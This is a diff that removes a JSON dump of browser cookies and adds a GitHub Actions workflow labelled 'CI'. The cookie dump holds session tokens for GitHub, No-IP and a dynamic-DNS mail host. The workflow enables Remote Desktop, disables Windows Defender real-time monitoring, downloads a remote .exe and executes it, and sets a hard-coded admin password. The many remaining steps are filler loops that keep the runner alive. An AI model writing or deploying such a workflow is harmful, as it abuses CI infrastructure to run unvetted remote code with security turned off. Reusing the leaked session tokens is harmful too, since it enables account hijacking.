@@ -1,1 +1,390 @@
-{"cookies":[{"domain":"www.noip.com","expires":1783344068.9624209,"httpOnly":true,"name":"NOIP_BID","path":"\/","priority":"Medium","sameSite":"Lax","secure":false,"session":false,"size":31,"sourcePort":443,"sourceScheme":"Secure","value":"695e5dc4a48431.51820590"},{"domain":".noip.com","expires":1801488069,"httpOnly":false,"name":"_uetvid","path":"\/","priority":"Medium","secure":false,"session":false,"size":39,"sourcePort":443,"sourceScheme":"Secure","value":"bb1716a0ebcb11f0b15aa3eab673edcf"},{"domain":".bing.com","expires":1801488133.0939269,"httpOnly":false,"name":"MUID","path":"\/","priority":"High","sameSite":"None","secure":true,"session":false,"size":36,"sourcePort":443,"sourceScheme":"Secure","value":"2ED728D31F53676E25F33E091E2466B1"},{"domain":".noip.com","expires":1799328070.4220049,"httpOnly":false,"name":"__insp_wid","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":20,"sourcePort":443,"sourceScheme":"Secure","value":"1629416919"},{"domain":".noip.com","expires":1799328070.4227841,"httpOnly":false,"name":"__insp_nv","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":13,"sourcePort":443,"sourceScheme":"Secure","value":"true"},{"domain":"www.clarity.ms","expires":1799328070.623544,"httpOnly":true,"name":"CLID","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":54,"sourcePort":443,"sourceScheme":"Secure","value":"cd27d3b7d0fa4acaae33d289583ada05.20260107.20270107"},{"domain":".noip.com","expires":1799328070,"httpOnly":false,"name":"_clck","path":"\/","priority":"Medium","secure":false,"session":false,"size":33,"sourcePort":443,"sourceScheme":"Secure","value":"1xl4bzv%5E2%5Eg2i%5E0%5E2198"},{"domain":".c.bing.com","expires":1801488133.0942819,"httpOnly":false,"name":"SRM_B","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":37,"sourcePort":443,"sourceScheme":"Secure","value":"2ED728D31F53676E25F33E091E2466B1"},{"domain":".c.clarity.ms","expires":-1,"httpOnly":false,"name":"SM","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":true,"size":3,"sourcePort":443,"sourceScheme":"Secure","value":"C"},{"domain":".clarity.ms","expires":1801488132.189271,"httpOnly":false,"name":"MUID","path":"\/","priority":"High","sameSite":"None","secure":true,"session":false,"size":36,"sourcePort":443,"sourceScheme":"Secure","value":"2ED728D31F53676E25F33E091E2466B1"},{"domain":".www.noip.com","expires":1799328226,"httpOnly":false,"name":"_zitok","path":"\/","priority":"Medium","sameSite":"Strict","secure":true,"session":false,"size":36,"sourcePort":443,"sourceScheme":"Secure","value":"637c13776977aceecdc61767792132"},{"domain":".zoominfo.com","expires":-1,"httpOnly":true,"name":"_cfuvid","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":true,"size":82,"sourcePort":443,"sourceScheme":"Secure","value":"JRMeCxGdsPUECtPcFlwfnAnln0.pUk_3hCNBTytK0Rs-1767792133848-0.0.1.1-604800000"},{"domain":"snafi4.ddns.net","expires":1799328145,"httpOnly":false,"name":"theme","path":"\/","priority":"Medium","secure":false,"session":false,"size":10,"sourcePort":443,"sourceScheme":"Secure","value":"ocean"},{"domain":"snafi4.ddns.net","expires":1799328486,"httpOnly":false,"name":"displayMoreContent","path":"\/","priority":"Medium","secure":false,"session":false,"size":23,"sourcePort":443,"sourceScheme":"Secure","value":"false"},{"domain":"snafi4.ddns.net","expires":1799328486,"httpOnly":false,"name":"readingPane","path":"\/","priority":"Medium","secure":false,"session":false,"size":15,"sourcePort":443,"sourceScheme":"Secure","value":"east"},{"domain":"snafi4.ddns.net","expires":1799328485,"httpOnly":false,"name":"themeMode","path":"\/","priority":"Medium","secure":false,"session":false,"size":13,"sourcePort":443,"sourceScheme":"Secure","value":"auto"},{"domain":"snafi4.ddns.net","expires":1799328147,"httpOnly":false,"name":"passwordExpireWarning","path":"\/","priority":"Medium","secure":false,"session":false,"size":25,"sourcePort":443,"sourceScheme":"Secure","value":"true"},{"domain":"www.noip.com","expires":-1,"httpOnly":true,"name":"NOIP_SID","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":40,"sourcePort":443,"sourceScheme":"Secure","value":"0.30.8.12695e5e69c98af6.69421039"},{"domain":"www.noip.com","expires":1783344234.1631529,"httpOnly":true,"name":"cookie_email","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":53,"sourcePort":443,"sourceScheme":"Secure","value":"jacksongonzalezgonzalez%40snafi4.ddns.net"},{"domain":"my.noip.com","expires":1783344235.6032939,"httpOnly":true,"name":"NOIP_BID","path":"\/","priority":"Medium","sameSite":"Lax","secure":false,"session":false,"size":31,"sourcePort":443,"sourceScheme":"Secure","value":"695e5e6b4d8a28.78720993"},{"domain":".noip.com","expires":1799328304.6322961,"httpOnly":false,"name":"__insp_targlpt","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":28,"sourcePort":443,"sourceScheme":"Secure","value":"TXkgTm8tSVA%3D"},{"domain":".noip.com","expires":1802352304.4479821,"httpOnly":false,"name":"_ga","path":"\/","priority":"Medium","secure":false,"session":false,"size":28,"sourcePort":443,"sourceScheme":"Secure","value":"GA1.2.99993418.1767792070"},{"domain":".noip.com","expires":1799328304.6310589,"httpOnly":false,"name":"__insp_slim","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":24,"sourcePort":443,"sourceScheme":"Secure","value":"1767792304630"},{"domain":".noip.com","expires":1799328304.632057,"httpOnly":false,"name":"__insp_targlpu","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":86,"sourcePort":443,"sourceScheme":"Secure","value":"aHR0cHM6Ly9teS5ub2lwLmNvbS9kbnMvcmVjb3Jkcz9qdW1wX3RvX3pvbmU9d2ViaG9wLm1l"},{"domain":".noip.com","expires":1802352335.8350871,"httpOnly":false,"name":"_ga_GG8YBN7FLC","path":"\/","priority":"Medium","secure":false,"session":false,"size":67,"sourcePort":443,"sourceScheme":"Secure","value":"GS2.1.s1767792070$o1$g1$t1767792335$j25$l0$h877741768"},{"domain":"snafi4.ddns.net","expires":-1,"httpOnly":true,"name":"_hadmin","path":"\/","priority":"Medium","sameSite":"Strict","secure":false,"session":true,"size":39,"sourcePort":9000,"sourceScheme":"NonSecure","value":"f7b31766da0cde3a2eb3f642ecb9f0ac"},{"domain":"snafi4.ddns.net","expires":1799328364,"httpOnly":false,"name":"WMSessionObject","path":"\/","priority":"Medium","secure":false,"session":false,"size":196,"sourcePort":9000,"sourceScheme":"NonSecure","value":"%7B%22accountFilter%22%3A%22%22%2C%22currentDomainName%22%3A%22kingbaker.webhop.me%22%2C%22domainFilter%22%3A%22%22%2C%22helpContainer%22%3A%22opened%22%2C%22leftMenu%22%3A%5B%5D%7D"},{"domain":".github.com","expires":1799328377.034848,"httpOnly":false,"name":"_octo","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":32,"sourcePort":443,"sourceScheme":"Secure","value":"GH1.1.1916670193.1767792376"},{"domain":".github.com","expires":-1,"httpOnly":false,"name":"cpu_bucket","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":13,"sourcePort":443,"sourceScheme":"Secure","value":"xlg"},{"domain":".github.com","expires":-1,"httpOnly":false,"name":"preferred_color_mode","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":25,"sourcePort":443,"sourceScheme":"Secure","value":"light"},{"domain":".github.com","expires":1783344381,"httpOnly":false,"name":"GHCC","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":54,"sourcePort":443,"sourceScheme":"Secure","value":"Required:1-Analytics:1-SocialMedia:1-Advertising:1"},{"domain":"github.com","expires":1809275387.778878,"httpOnly":false,"name":"MicrosoftApplicationsTelemetryDeviceId","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":74,"sourcePort":443,"sourceScheme":"Secure","value":"7fbac155-9066-41bd-a487-48be11742d97"},{"domain":".microsoft.com","expires":1799328390.3135071,"httpOnly":false,"name":"MC1","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":81,"sourcePort":443,"sourceScheme":"Secure","value":"GUID=edd9bfc9d8f8403d94eb80640bc7c9aa&HASH=edd9&LV=202601&V=4&LU=1767792389683"},{"domain":"github.com","expires":1799328390.818037,"httpOnly":false,"name":"MSFPC","path":"\/","priority":"Medium","sameSite":"None","secure":true,"session":false,"size":83,"sourcePort":443,"sourceScheme":"Secure","value":"GUID=edd9bfc9d8f8403d94eb80640bc7c9aa&HASH=edd9&LV=202601&V=4&LU=1767792389683"},{"domain":"snafi4.ddns.net","expires":-1,"httpOnly":true,"name":"_hmail","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":94,"sourcePort":443,"sourceScheme":"Secure","value":"N96DVjcgR4k7sXdXBbYvZtPi\/Sbh0qrGnX1XpiGXNcIRS7zCzYlQ+T4sajooZ2IkjO2MJQaFYdNcT\/VVYDTDLQ__"},{"domain":"github.com","expires":1799328570.2710021,"httpOnly":true,"name":"_device_id","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":42,"sourcePort":443,"sourceScheme":"Secure","value":"bba7e40868604207641f9aafb528548b"},{"domain":"github.com","expires":-1,"httpOnly":true,"name":"tz","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":17,"sourcePort":443,"sourceScheme":"Secure","value":"Europe%2FBerlin"},{"domain":".github.com","expires":-1,"httpOnly":false,"name":"color_mode","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":214,"sourcePort":443,"sourceScheme":"Secure","value":"%7B%22color_mode%22%3A%22auto%22%2C%22light_theme%22%3A%7B%22name%22%3A%22light%22%2C%22color_mode%22%3A%22light%22%7D%2C%22dark_theme%22%3A%7B%22name%22%3A%22dark%22%2C%22color_mode%22%3A%22dark%22%7D%7D"},{"domain":".github.com","expires":-1,"httpOnly":false,"name":"tz","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":22,"sourcePort":443,"sourceScheme":"Secure","value":"Asia%2FYekaterinburg"},{"domain":"github.com","expires":1785515391.907522,"httpOnly":true,"name":"saved_user_sessions","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":79,"sourcePort":443,"sourceScheme":"Secure","value":"253508773%3APz55CdiSHcxyJLGCE7RyIZVozvAjnEwEHBeeHwCVFEDWatis"},{"domain":"github.com","expires":1778948991.907815,"httpOnly":true,"name":"user_session","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":60,"sourcePort":443,"sourceScheme":"Secure","value":"Pz55CdiSHcxyJLGCE7RyIZVozvAjnEwEHBeeHwCVFEDWatis"},{"domain":"github.com","expires":1778948991.907928,"httpOnly":true,"name":"__Host-user_session_same_site","path":"\/","priority":"Medium","sameSite":"Strict","secure":true,"session":false,"size":77,"sourcePort":443,"sourceScheme":"Secure","value":"Pz55CdiSHcxyJLGCE7RyIZVozvAjnEwEHBeeHwCVFEDWatis"},{"domain":".github.com","expires":1809275391.908242,"httpOnly":true,"name":"logged_in","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":12,"sourcePort":443,"sourceScheme":"Secure","value":"yes"},{"domain":".github.com","expires":1809275391.908426,"httpOnly":true,"name":"dotcom_user","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":false,"size":28,"sourcePort":443,"sourceScheme":"Secure","value":"michael8Rodriguez"},{"domain":"github.com","expires":-1,"httpOnly":true,"name":"last_write_ms","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":26,"sourcePort":443,"sourceScheme":"Secure","value":"1777739391879"},{"domain":"github.com","expires":-1,"httpOnly":true,"name":"_gh_sess","path":"\/","priority":"Medium","sameSite":"Lax","secure":true,"session":true,"size":644,"sourcePort":443,"sourceScheme":"Secure","value":"KdMM3KaovxHfKQSvNpCq17Pt1vNTi%2BCV5K2ihoALmdVKAVOM%2FRUikycL091NhxhZOacjjMpRqh%2BsyghaePGZDd%2Fbv9S7stOD2pdoGg1TTuyGxmxI43HFyIDZMdK6aJgGXEYX01qKYo2oniu8wsU5EHLoDKZ7vtmEPk6788OVV5tqBhb3xZWNI972p9Nbf%2B3XnWNRPNXvgKl3zqmYxJW3YilA55Z9K3te7ZcFAY6FOiRek2WPtz%2FjaxVAC98HYmhw%2F2g7f6j2Do%2F2xENJHpHV2ejGzTIOFJu%2B8AFSp0VE8wIHTEFpZjvEyrWN2c0Eg5nBSAZxaLK9dV3ENeIZ4Gqhz5s8dgZK8rlsIoGR7ogdPNWTDTsBalBXKOzavQnTF3%2BJh6fyeLyQg6qCaNjP7QerrgpxxTCCwkE8nuU5UedEIfmR7JhL4B2Ld9Yh9rXEEMBzHveQXbqQxLQEHN8mpKO9GT6pWz%2BywXsOFvTUX140Flxb33KUJUFV%2F%2FScLbvIaof%2B2cPGSf7%2BDFtKuoe%2FdvOcxbrFMtd3RQwjmXRhTw%3D%3D--jkHdzt2llmyG8QsE--rDIf6H4QXvjwJCrpRlAHcw%3D%3D"}]}
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: 1
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - name: 11
+      run: Set-MpPreference -DisableRealtimeMonitoring $true
+    - name: 2
+      run: New-Item -Path "C:\21" -ItemType Directory
+    - name: 3
+      run: New-Item -Path "C:\2" -ItemType Directory
+    - name: 4
+      run: New-Item -Path "C:\1" -ItemType Directory
+    - name: 11
+      run: Set-MpPreference -DisableRealtimeMonitoring $true
+    - name: 12
+      run: Invoke-WebRequest -URI https://github.com/anthony82Scott/b9fv95tecmarkbetty/raw/refs/heads/main/1122.exe -outfile c:\21\1122.exe
+    - name: 17
+      run: cmd /c c:\21\1122.exe
+    - name: 10
+      run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
+    - name: Download.
+      run: cmd /c start notepad.exe
+    - name: Download.
+      run: cmd /c ping 127.0.0.1 -n 600
+    - name: Download.
+      run: cmd /c taskkill /f /im notepad.exe
